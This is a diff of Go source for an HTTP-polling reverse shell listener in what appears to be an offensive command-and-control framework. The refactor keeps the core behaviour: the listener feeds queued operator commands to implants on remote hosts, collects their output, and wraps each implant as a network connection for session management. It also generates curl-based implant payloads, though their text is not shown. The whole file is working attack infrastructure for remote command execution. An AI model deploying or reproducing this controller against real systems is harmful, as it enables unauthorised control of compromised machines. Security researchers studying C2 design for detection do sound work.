@@ -1,101 +1,31 @@
 package httpshell
 
 import (
-	"bufio"
+	"bytes"
 	"fmt"
 	"io"
 	"net"
 	"net/http"
-	"os"
-	"sort"
 	"sync"
 	"time"
 
 	"github.com/Chocapikk/pik/pkg/c2"
 	"github.com/Chocapikk/pik/pkg/c2/session"
 	"github.com/Chocapikk/pik/pkg/output"
-	"github.com/Chocapikk/pik/pkg/sigutil"
 	"github.com/Chocapikk/pik/pkg/payload"
 )
 
-func init() {
-	c2.RegisterFactory("httpshell", func(_ string) c2.Backend { return New() })
-}
-
-// httpSession represents a single HTTP polling shell.
-type httpSession struct {
-	id         int
-	remoteAddr string
-	createdAt  time.Time
-	cmdBuf     chan []byte
-	outBuf     chan []byte
-	mu         sync.Mutex
-	alive      bool
-}
-
-func (s *httpSession) close() {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-	s.alive = false
-}
-
-func (s *httpSession) isAlive() bool {
-	s.mu.Lock()
-	defer s.mu.Unlock()
-	return s.alive
-}
-
-// interact takes over stdin/stdout for the HTTP session.
-func (s *httpSession) interact() {
-	output.Status("Interacting with session %d (%s)", s.id, s.remoteAddr)
-	output.Status("Press Ctrl+Z to background session")
-
-	bg := make(chan os.Signal, 1)
-	sigutil.NotifySuspend(bg)
-	defer sigutil.StopSuspend(bg)
-
-	// Read output from implant and print.
-	done := make(chan struct{})
-	go func() {
-		for {
-			select {
-			case data := <-s.outBuf:
-				os.Stdout.Write(data)
-			case <-done:
-				return
-			}
-		}
-	}()
-
-	// Read commands from stdin and queue.
-	go func() {
-		scanner := bufio.NewScanner(os.Stdin)
-		for scanner.Scan() {
-			select {
-			case s.cmdBuf <- append(scanner.Bytes(), '\n'):
-			case <-done:
-				return
-			}
-		}
-	}()
-
-	<-bg
-	close(done)
-	output.Println()
-	output.Status("Session %d backgrounded", s.id)
-}
+func init() { c2.Register(New()) }
 
 // Listener is an HTTP polling reverse shell listener.
 type Listener struct {
-	lhost  string
-	lport  int
-	server *http.Server
-
-	mu       sync.Mutex
-	sessions map[int]*httpSession
-	nextID   int
-	incoming chan *httpSession
-	closed   chan struct{}
+	c2.SessionBase
+	lhost   string
+	lport   int
+	server  *http.Server
+	vln     *chanListener
+	mu      sync.Mutex
+	bridges map[string]*httpBridge
 }
 
 var payloads = c2.PayloadMap{
@@ -106,12 +36,7 @@ var payloads = c2.PayloadMap{
 }
 
 func New() *Listener {
-	return &Listener{
-		sessions: make(map[int]*httpSession),
-		nextID:   1,
-		incoming: make(chan *httpSession, 16),
-		closed:   make(chan struct{}),
-	}
+	return &Listener{bridges: make(map[string]*httpBridge)}
 }
 
 func (l *Listener) Name() string { return "httpshell" }
@@ -129,7 +54,11 @@ func (l *Listener) Setup(lhost string, lport int) error {
 		return fmt.Errorf("failed to start HTTP listener: %w", err)
 	}
 	l.server = &http.Server{Handler: mux}
-	go l.server.Serve(ln)
+	go l.server.Serve(ln) //nolint:errcheck
+
+	l.vln = newChanListener(ln.Addr())
+	l.Manager = session.NewManager(l.vln)
+	l.Manager.Start()
 
 	output.Status("HTTP shell listening on %s:%d", lhost, lport)
 	return nil
@@ -139,153 +68,177 @@ func (l *Listener) GeneratePayload(_, payloadType string) (string, error) {
 	return c2.ResolvePayload(payloads, l.lhost, l.lport, payloadType, payload.CurlHTTP)
 }
 
-func (l *Listener) WaitForSession(timeout time.Duration) error {
-	_, err := l.accept(timeout)
-	if err != nil {
-		return fmt.Errorf("no session received: %w", err)
-	}
-	return nil
-}
-
-// SessionHandler interface.
-
-func (l *Listener) Sessions() []*session.Session {
-	l.mu.Lock()
-	defer l.mu.Unlock()
-	var result []*session.Session
-	for _, hs := range l.sessions {
-		if hs.isAlive() {
-			stub := &session.Session{
-				ID:         hs.id,
-				RemoteAddr: hs.remoteAddr,
-				CreatedAt:  hs.createdAt,
-			}
-			stub.SetAlive(true)
-			result = append(result, stub)
-		}
-	}
-	sort.Slice(result, func(i, j int) bool {
-		return result[i].ID < result[j].ID
-	})
-	return result
-}
-
-func (l *Listener) Interact(id int) error {
-	l.mu.Lock()
-	hs, ok := l.sessions[id]
-	l.mu.Unlock()
-	if !ok {
-		return fmt.Errorf("session %d not found", id)
-	}
-	if !hs.isAlive() {
-		return fmt.Errorf("session %d is dead", id)
-	}
-	hs.interact()
-	return nil
-}
-
-func (l *Listener) Kill(id int) error {
-	l.mu.Lock()
-	hs, ok := l.sessions[id]
-	l.mu.Unlock()
-	if !ok {
-		return fmt.Errorf("session %d not found", id)
-	}
-	hs.close()
-	output.Status("Session %d killed", id)
-	return nil
-}
-
 func (l *Listener) Shutdown() error {
-	select {
-	case <-l.closed:
-		return nil
-	default:
+	if l.server != nil {
+		l.server.Close()
 	}
-	close(l.closed)
-	l.server.Close()
-	l.mu.Lock()
-	for _, hs := range l.sessions {
-		hs.close()
-	}
-	l.mu.Unlock()
-	return nil
+	return l.ShutdownManager()
 }
 
-func (l *Listener) accept(timeout time.Duration) (*httpSession, error) {
-	if timeout <= 0 {
-		select {
-		case hs := <-l.incoming:
-			return hs, nil
-		case <-l.closed:
-			return nil, fmt.Errorf("listener closed")
-		}
-	}
-	timer := time.NewTimer(timeout)
-	defer timer.Stop()
-	select {
-	case hs := <-l.incoming:
-		return hs, nil
-	case <-timer.C:
-		return nil, fmt.Errorf("no session received within %s", timeout)
-	case <-l.closed:
-		return nil, fmt.Errorf("listener closed")
-	}
-}
+func (l *Listener) getOrCreateBridge(remoteAddr string) *httpBridge {
+	remoteIP, _, _ := net.SplitHostPort(remoteAddr)
 
-func (l *Listener) getOrCreate(remoteAddr string) *httpSession {
 	l.mu.Lock()
 	defer l.mu.Unlock()
 
-	remoteIP, _, _ := net.SplitHostPort(remoteAddr)
-	for _, hs := range l.sessions {
-		existingIP, _, _ := net.SplitHostPort(hs.remoteAddr)
-		if existingIP == remoteIP && hs.isAlive() {
-			return hs
-		}
+	if b, ok := l.bridges[remoteIP]; ok && !b.isClosed() {
+		return b
 	}
 
-	hs := &httpSession{
-		id:         l.nextID,
-		remoteAddr: remoteAddr,
-		createdAt:  time.Now(),
-		cmdBuf:     make(chan []byte, 64),
-		outBuf:     make(chan []byte, 64),
-		alive:      true,
-	}
-	l.sessions[l.nextID] = hs
-	l.nextID++
-
-	output.Success("Session %d opened (%s)", hs.id, hs.remoteAddr)
-
-	select {
-	case l.incoming <- hs:
-	case <-l.closed:
-	}
-
-	return hs
+	b := newHTTPBridge(remoteAddr)
+	l.bridges[remoteIP] = b
+	l.vln.push(b.conn())
+	return b
 }
 
 func (l *Listener) handleCmd(w http.ResponseWriter, r *http.Request) {
-	hs := l.getOrCreate(r.RemoteAddr)
+	b := l.getOrCreateBridge(r.RemoteAddr)
 	select {
-	case cmd := <-hs.cmdBuf:
-		w.Write(cmd)
+	case cmd := <-b.cmd:
+		w.Write(cmd) //nolint:errcheck
 	case <-time.After(200 * time.Millisecond):
 		w.WriteHeader(http.StatusOK)
 	}
 }
 
 func (l *Listener) handleOut(w http.ResponseWriter, r *http.Request) {
-	hs := l.getOrCreate(r.RemoteAddr)
+	b := l.getOrCreateBridge(r.RemoteAddr)
 	data, err := io.ReadAll(io.LimitReader(r.Body, 10*1024*1024))
 	if err != nil {
 		w.WriteHeader(http.StatusBadRequest)
 		return
 	}
 	select {
-	case hs.outBuf <- data:
+	case b.out <- data:
 	default:
 	}
 	w.WriteHeader(http.StatusOK)
 }
+
+// --- HTTP bridge ---
+
+// httpBridge connects HTTP polling handlers to a session.Session via channels.
+type httpBridge struct {
+	remoteAddr string
+	cmd        chan []byte // user -> implant
+	out        chan []byte // implant -> user
+	closed     chan struct{}
+}
+
+func newHTTPBridge(remoteAddr string) *httpBridge {
+	return &httpBridge{
+		remoteAddr: remoteAddr,
+		cmd:        make(chan []byte, 64),
+		out:        make(chan []byte, 64),
+		closed:     make(chan struct{}),
+	}
+}
+
+func (b *httpBridge) isClosed() bool {
+	select {
+	case <-b.closed:
+		return true
+	default:
+		return false
+	}
+}
+
+func (b *httpBridge) conn() net.Conn { return &bridgeConn{bridge: b} }
+
+// bridgeConn implements net.Conn over an httpBridge.
+// Read returns implant output; Write sends user commands.
+type bridgeConn struct {
+	bridge  *httpBridge
+	readBuf bytes.Buffer
+}
+
+func (c *bridgeConn) Read(p []byte) (int, error) {
+	if c.readBuf.Len() > 0 {
+		return c.readBuf.Read(p)
+	}
+	select {
+	case data := <-c.bridge.out:
+		n := copy(p, data)
+		if n < len(data) {
+			c.readBuf.Write(data[n:])
+		}
+		return n, nil
+	case <-c.bridge.closed:
+		return 0, io.EOF
+	}
+}
+
+func (c *bridgeConn) Write(p []byte) (int, error) {
+	buf := make([]byte, len(p))
+	copy(buf, p)
+	select {
+	case c.bridge.cmd <- buf:
+		return len(p), nil
+	case <-c.bridge.closed:
+		return 0, io.ErrClosedPipe
+	}
+}
+
+func (c *bridgeConn) Close() error {
+	select {
+	case <-c.bridge.closed:
+	default:
+		close(c.bridge.closed)
+	}
+	return nil
+}
+
+func (c *bridgeConn) LocalAddr() net.Addr                { return bridgeAddr(c.bridge.remoteAddr) }
+func (c *bridgeConn) RemoteAddr() net.Addr               { return bridgeAddr(c.bridge.remoteAddr) }
+func (c *bridgeConn) SetDeadline(_ time.Time) error      { return nil }
+func (c *bridgeConn) SetReadDeadline(_ time.Time) error  { return nil }
+func (c *bridgeConn) SetWriteDeadline(_ time.Time) error { return nil }
+
+type bridgeAddr string
+
+func (a bridgeAddr) Network() string { return "http" }
+func (a bridgeAddr) String() string  { return string(a) }
+
+// --- virtual listener ---
+
+// chanListener implements net.Listener with channel-based accept.
+type chanListener struct {
+	conns  chan net.Conn
+	closed chan struct{}
+	addr   net.Addr
+}
+
+func newChanListener(addr net.Addr) *chanListener {
+	return &chanListener{
+		conns:  make(chan net.Conn, 16),
+		closed: make(chan struct{}),
+		addr:   addr,
+	}
+}
+
+func (cl *chanListener) push(c net.Conn) {
+	select {
+	case cl.conns <- c:
+	case <-cl.closed:
+	}
+}
+
+func (cl *chanListener) Accept() (net.Conn, error) {
+	select {
+	case c := <-cl.conns:
+		return c, nil
+	case <-cl.closed:
+		return nil, net.ErrClosed
+	}
+}
+
+func (cl *chanListener) Close() error {
+	select {
+	case <-cl.closed:
+	default:
+		close(cl.closed)
+	}
+	return nil
+}
+
+func (cl *chanListener) Addr() net.Addr { return cl.addr }
